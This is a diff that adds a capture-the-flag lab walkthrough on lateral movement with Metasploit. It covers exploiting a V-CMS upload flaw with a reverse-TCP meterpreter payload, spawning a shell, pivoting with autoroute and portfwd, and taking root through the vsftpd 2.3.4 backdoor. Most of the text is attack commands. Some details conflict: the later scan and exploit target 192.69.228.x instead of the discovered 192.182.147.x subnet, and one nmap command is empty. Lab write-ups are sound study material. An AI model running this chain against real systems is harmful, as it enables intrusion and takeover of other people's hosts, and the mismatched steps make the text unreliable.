@@ -1,0 +1,115 @@
+Lateral movements
+Lateral movement is a technique that adversaries use, after compromising an endpoint, to extend access to other hosts or applications in an organization.
+
+lateral-movement.png
+
+using metasploit
+Get our ip
+
+ip a 
+# 192.64.166.2
+Get machine ip 
+
+ping demo.ine.local
+# 192.64.166.3
+Enumerate services in the target machine
+
+nmap -sV -sS -O 192.64.166.3
+# open ports: 80 and 3306.
+Go further on port 80
+
+nmap 
+# In the scan you will see: V-CMS-Powered by V-CMS  and PHPSESSID: httponly flag not set
+Launch metasploit and search for v-cms
+
+service postgresql start
+msfconsole -q
+
+search v-cms
+Use the exploit exploit/linux/http/vcms_upload, configure it and run it
+
+use exploit/linux/http/vcms_upload
+show options
+
+set RHOST 192.64.166.3
+set TARGETURI /
+set LHOST 192.64.166.2
+set payload php/meterpreter/reverse_tcp
+run
+You will get a limited meterpreter. Access to the shell and print the flag
+
+meterpreter> shell
+> cat /root/flag.txt
+# 4f96a3e848d233d5af337c440e50fe3d
+Map other possible interfaces in the machine. Since ifconfig does not work, spawn the shell and try again
+
+ifconfig 
+# does not work
+
+ipconfig
+# does not work
+
+which python
+# it’s located under /bin, so we can use python to spawn the shell
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+$root@machine> ifconfig
+# it tells us about another interface: 192.182.147.2
+route
+Add tunnel from interface 192.64.166.3 (which is session 1 of meterpreter) and the discovered interface, 192.182.147.2 with the utility route:
+
+$root@machine> exit
+
+meterpreter> run autoroute -s 192.182.147.0 -n 255.255.255.0
+# you can also add a route out of the meterpreter. In that case you need to specify the meterpreter session: route add 192.182.147.0 .0 255.255.255.0 1
+Background the meterpreter session and check if the route is added successfully to the metasploit's routing table.
+
+meterpreter> background
+msf> route print
+Run auxiliary TCP port scanning module to discover any available hosts (From IP .3 to .10). And, if any of ports 80, 8080, 445, 21 and 22 are open on those hosts.
+
+msf> use auxiliary/scanner/portscan/tcp
+
+msf  auxiliary/scanner/portscan/tcp > set PORTS 80, 8080, 445, 21, 22
+
+msf  auxiliary/scanner/portscan/tcp > set RHOSTS 192.69.228.3-10
+
+msf  auxiliary/scanner/portscan/tcp > exploit
+# Give us ports 21 and 22 open at 192.182.147.3
+portfwd
+In order to reach the discovered target, we need to fordward remote machine port to the local machine port. We want to target port 21 of that machine so we will forward remote port 21 to the local port 1234. This is done with the utility portfwd from meterpreter
+
+msf  auxiliary/scanner/portscan/tcp > sessions -i 1
+
+meterpreter> portfwd
+# Tell you  there is none configured
+
+meterpreter> portfwd add -l 1234 -p 21 -r 192.182.147.3
+# -l: local port 
+# -p 21 The port we are targeting in our attack 
+# -r the remote host
+
+meterpreter> portfwd list
+# It tells the active Port Forwards. Now, scan the local port using Nmap
+Run nmap on the forwarded local port to identify the service name
+
+meterpreter> background
+
+msf> nmap -sS -sV -p 1234 localhost
+# It tells you the ftp version: vsftpd 2.0.8 or later
+Search for vsftpd exploit module and exploit the target host using vsftpd backdoor exploit module.
+
+msf > search vsftpd 
+msf> use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit/unix/ftp/vsftpd_234_backdoor>   set RHOSTS 192.69.228.3
+msf exploit/unix/ftp/vsftpd_234_backdoor> exploit
+
+# Sometimes, the exploit fails the first time. If that happens then please run the exploit again.
+
+$> id
+# you are root.
+Print the flag
+
+$> cat /root/flag.txt
+# 58c7c29a8ab5e7c4c06256b954947f9a
